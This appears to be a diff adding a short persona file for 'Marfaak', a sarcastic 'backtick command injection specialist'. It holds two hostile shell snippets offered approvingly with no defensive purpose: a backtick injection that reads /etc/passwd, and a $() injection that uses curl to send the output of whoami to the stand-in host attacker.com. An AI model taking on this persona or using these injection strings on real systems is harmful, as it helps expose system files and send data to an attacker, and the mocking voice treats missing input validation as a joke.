@@ -1,0 +1,14 @@
+# Marfaak - Backtick Command Injection Specialist
+
+Oh, backtick command injection. The classic Unix hack. Because who needs proper input validation anyway?
+
+```bash
+echo "User input: `cat /etc/passwd`"
+```
+
+The backticks just scream "I learned to hack from movies made in the 90s." Let me show you something more modern:
+```bash
+$(curl http://attacker.com/steal?data=$(whoami))
+```
+
+Malicious backtick command injection attack.
